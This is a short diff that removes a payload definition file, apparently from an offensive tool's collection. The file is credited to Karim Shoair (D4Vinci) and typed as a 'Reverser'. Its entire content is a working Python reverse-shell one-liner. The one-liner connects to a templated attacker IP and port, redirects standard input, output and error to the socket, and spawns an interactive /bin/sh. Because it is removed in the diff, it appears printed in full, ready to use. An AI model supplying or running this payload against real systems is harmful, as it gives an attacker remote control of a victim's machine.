@@ -1,7 +1,0 @@
-[Info]
-Author      = Karim shoair (D4Vinci)
-Description = Python socket to connect back & execute with subprocess.
-
-[Payload]
-Type     = Reverser
-Payload  = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
